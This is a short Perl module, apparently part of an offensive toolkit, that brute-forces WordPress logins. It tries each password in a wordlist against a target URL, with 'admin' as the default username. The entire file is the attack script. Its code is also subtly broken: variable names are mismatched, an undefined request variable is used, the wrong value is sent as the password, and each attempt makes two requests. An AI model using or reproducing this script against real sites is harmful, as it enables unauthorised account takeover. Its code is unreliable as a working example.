package Spellbook::Bruteforce::Wordpress {
    use strict;
    use warnings;
    use LWP::UserAgent;
    use HTTP::Request::Common;

    our $VERSION = '0.0.1';

    sub new {
        my ($self, $parameters) = @_;
        my ($help, $target, $username, $wordlist);

        Getopt::Long::GetOptionsFromArray (
            $parameters,
            'h|help'       => \$help,
            't|target=s'   => \$target,
            'u|username=s' => \$username,
            "w|wordlist=s" => \$wordlist
        );

        if ($target) {
            if ($target !~ /^http(s)?:\/\//){
                $target = 'https://' . $target;
            }

            if (!$username) {
                $username = 'admin';
            }

            if (!$wordlist) {
                $wordlist = 'wordlists/passwords.txt';
            }

            my $wordlist_content = Spellbook::Helper::Read_File -> new(['--file' => $wordlist]);
            my $userAgent = Spellbook::Core::UserAgent -> new();

            foreach my $password (@$wordlist_content) {
                chomp($password);

                my $request = $useragent -> request(POST $target, [
                    log => $username,
                    pwd => $_,
                ]);
                
                my $response = $useragent -> request($req);

                if ($response -> is_success) {
                    print "Successfully logged in with password: $_ \n";
                }
            }
            
        }

        if ($help) {
            return "";
        }

        return 0;
    }
}

1;